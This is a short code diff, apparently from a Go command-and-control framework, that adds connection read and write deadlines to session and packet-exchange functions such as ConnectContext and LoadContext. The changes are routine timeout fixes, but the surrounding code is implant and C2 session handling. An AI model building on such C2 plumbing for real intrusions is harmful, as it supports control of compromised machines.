@@ -86,6 +86,7 @@ func ShootContext(x context.Context, p Profile, n *com.Packet) error {
 		n = &com.Packet{Device: local.UUID}
 	}
 	n.Flags |= com.FlagOneshot
+	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
 	err = writePacket(c, w, t, n)
 	if c.Close(); err != nil {
 		return xerr.Wrap("unable to write packet", err)
@@ -134,10 +135,14 @@ func ConnectContext(x context.Context, l logx.Log, p Profile) (*Session, error) 
 	if bugtrack.Enabled {
 		bugtrack.Track("c2.receiveSingle(): %s KeyCrypt details [%v].", s.ID, s.key)
 	}
+	// Set an initial write deadline, to make sure that the connection is stable.
+	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
 	if err = writePacket(c, s.w, s.t, n); err != nil {
 		c.Close()
 		return nil, xerr.Wrap("first Packet write", err)
 	}
+	// Set an initial read deadline, to make sure that the connection is stable.
+	c.SetReadDeadline(time.Now().Add(spawnDefaultTime))
 	r, err := readPacket(c, s.w, s.t)
 	c.Close()
 	if n.Clear(); err != nil {
@@ -212,6 +217,8 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		buf [8]byte
 		_   = buf[7]
 	)
+	// Set a connection deadline. I doubt this will fail, but let's be sure.
+	c.SetDeadline(time.Now().Add(spawnDefaultTime * 2))
 	if err = readFull(r, 3, buf[0:3]); err != nil {
 		c.Close()
 		return nil, xerr.Wrap("read Job ID", err)
@@ -296,11 +303,15 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	}
 	// KeyCrypt: Encrypt first packet
 	o.Crypt(&s.key)
+	// Set an initial write deadline, to make sure that the connection is stable.
+	k.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
 	if err = writePacket(k, s.w, s.t, o); err != nil {
 		k.Close()
 		return nil, xerr.Wrap("first Packet write", err)
 	}
 	o.Clear()
+	// Set an initial read deadline, to make sure that the connection is stable.
+	k.SetReadDeadline(time.Now().Add(spawnDefaultTime))
 	o, err = readPacket(k, s.w, s.t)
 	if k.Close(); err != nil {
 		return nil, xerr.Wrap("first Packet read", err)
